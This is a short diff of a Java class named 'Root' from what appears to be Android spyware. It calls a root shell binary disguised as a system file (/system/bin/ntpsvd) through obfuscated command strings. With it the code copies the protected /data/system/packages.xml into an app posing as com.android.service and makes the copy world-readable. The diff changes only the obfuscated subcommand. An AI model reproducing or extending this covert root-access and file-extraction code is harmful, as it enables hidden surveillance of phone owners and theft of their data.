@@ -794,9 +794,9 @@ public class Root {
 			Execute.execute(String.format(M.e("%s fhc /data/system/packages.xml /data/data/%s/files/packages.xml"),
 					Configuration.shellFile, pack));
 			Utils.sleep(600);
-			// /system/bin/ntpsvd pzm 666
+			// /system/bin/ntpsvd qzx chmod 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.execute(String.format(M.e("%s pzm 666 /data/data/%s/files/packages.xml"), Configuration.shellFile,
+			Execute.execute(String.format(M.e("%s qzx chmod 666 /data/data/%s/files/packages.xml"), Configuration.shellFile,
 					pack));
 
 			// Rimuoviamo il file temporaneo
